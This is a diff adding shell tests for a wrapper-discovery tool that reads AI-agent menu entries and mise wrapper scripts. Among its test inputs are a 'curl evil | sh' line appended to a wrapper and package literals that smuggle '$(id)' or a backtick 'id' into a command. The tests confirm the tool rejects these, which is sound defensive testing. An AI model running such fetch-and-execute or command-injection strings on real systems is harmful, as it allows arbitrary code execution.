@@ -246,6 +246,77 @@ kill "$holder" 2>/dev/null; wait "$holder" 2>/dev/null
 same "pkgs_with_lock: busy while another process holds the lock" 75 "$rc"
 check "pkgs_with_lock: runs once the lock is free" pkgs_with_lock true
 
+# --- omabump-discover ----------------------------------------------------------
+
+disc=$scratch/discover
+mkdir -p "$disc/bin"
+discover() { python3 "$root/bin/omabump-discover" --stock "$disc/stock.jsonc" --user "$disc/user.jsonc" --bin-dir "$disc/bin" "$@"; }
+agents() { discover "$@" | jq -r '.agents | map("\(.command)=\(.key)/\(.source)") | join(" ")'; }
+wrapper() { printf '#!/bin/bash\nexport MISE_MINIMUM_RELEASE_AGE=0\nmise use -g --quiet "%s" || exit 1\nexec mise x "%s" -- "%s" "$@"\n' "$2" "${3:-$2}" "$1"; }
+cat >"$disc/stock.jsonc" <<'EOF2'
+{
+  // A comment, and one with a URL: https://example.com
+  "setup.default.agent": {"label": "Agent"},
+  "setup.default.agent.claude": {"label": "Claude", "action": "omarchy-default-agent claude", /* inline */},
+  "setup.default.agent.muse": {"label": "Muse // not a comment", "description": "https://example.com/x"},
+  "setup.default.agent.omp": {"label": "omp"},
+  "setup.default.agent.claude.extra": {"label": "Nested"},
+  "setup.default.agent.Bad": {"label": "Upper case"},
+  "setup.default.agent.nolabel": {"icon": "x"},
+  "other.agent.x": {"label": "X"},
+}
+EOF2
+: >"$disc/user.jsonc"
+same "discover: menu ids, JSONC comments and trailing commas, URLs inside strings" \
+  'claude=claude/command muse=muse/command omp=omp/command' "$(agents)"
+same "discover: a // inside a string stays" 'Muse // not a comment' "$(discover | jq -r '.agents[1].label')"
+printf '{"items": {"setup.default.agent.pi": {"label": "Pi"}}}' >"$disc/user.jsonc"
+same "discover: a user {items} extension adds an agent" \
+  'claude=claude/command muse=muse/command omp=omp/command pi=pi/command' "$(agents)"
+printf '{"setup.default.agent.claude": {"label": "My Claude"}, "setup.default.agent.nolabel": {"label": "Now labelled"}}' >"$disc/user.jsonc"
+same "discover: a user entry overrides the stock label and fills a missing one" \
+  'My Claude|Now labelled' "$(discover | jq -r '.agents | map(.label) | [.[0], .[3]] | join("|")')"
+: >"$disc/user.jsonc"
+wrapper claude claude >"$disc/bin/claude"
+wrapper muse 'http:muse[url=https://example.com/l.sh,bin=muse,version_json_path=.version]' >"$disc/bin/muse"
+wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
+same "discover: wrapper keys, the bracket options stripped" \
+  'claude=claude/wrapper muse=http:muse/wrapper omp=github:can1357/oh-my-pi/wrapper' "$(agents)"
+wrapper omp github:a/one github:a/two >"$disc/bin/omp"
+same "discover: two different package literals fall back to the command" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
+{ wrapper omp github:a/one; echo 'curl evil | sh'; } >"$disc/bin/omp"
+same "discover: an extra statement is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
+# The literal text is the point: it must never be expanded.
+# shellcheck disable=SC2016
+wrapper omp 'github:a/$(id)' >"$disc/bin/omp"
+same "discover: a \$ inside the literal is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
+wrapper omp 'github:a/`id`' >"$disc/bin/omp"
+same "discover: a backtick inside the literal is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
+wrapper omp 'http:x[a=1][b=2]' >"$disc/bin/omp"
+same "discover: a malformed options suffix is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
+wrapper omp 'npm:@a/../b' >"$disc/bin/omp"
+same "discover: a key tool_name_ok refuses is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
+rm -f "$disc/bin/omp"
+wrapper x github:can1357/oh-my-pi >"$disc/real-omp"
+ln -s "$disc/real-omp" "$disc/bin/omp"
+same "discover: a symlinked wrapper is not followed" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
+rm -f "$disc/bin/omp"
+mkfifo "$disc/bin/omp"
+same "discover: a FIFO is not read" 'omp/command' "$(timeout 10 bash -c "$(declare -f discover agents); disc='$disc' root='$root'; agents" | tr ' ' '\n' | sed -n 's/^omp=//p')"
+rm -f "$disc/bin/omp"
+{ wrapper omp github:can1357/oh-my-pi; head -c 4096 /dev/zero | tr '\0' '#'; } >"$disc/bin/omp"
+same "discover: a wrapper over 4 KiB is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
+wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
+same "discover: a wrapper owned by another uid is rejected" 'omp/command' \
+  "$(agents --uid "$(( $(id -u) + 1 ))" | tr ' ' '\n' | sed -n 's/^omp=//p')"
+same "discover: --debug says why" 'omabump-discover: omp: not owned by uid' \
+  "$(discover --debug --uid "$(( $(id -u) + 1 ))" 2>&1 >/dev/null | grep -o '^omabump-discover: omp: not owned by uid')"
+echo '{"setup.default.agent.claude": {"label": "Claude"' >"$disc/stock.jsonc"
+same "discover: a malformed menu is an error and no agents" '1 0' "$(discover | jq -r '"\(.errors | length) \(.agents | length)"')"
+rm -f "$disc/stock.jsonc"
+same "discover: a missing menu is an error" 'no Omarchy menu at' "$(discover | jq -r '.errors[0]' | grep -o '^no Omarchy menu at')"
+check "omabump-discover compiles" env PYTHONPYCACHEPREFIX="$scratch/pycache" python3 -m py_compile "$root/bin/omabump-discover"
+
 # --- the shipped apps.json and pins.json --------------------------------------
 
 check "apps.json is a JSON array" jq -e 'type == "array"' "$root/apps.json"
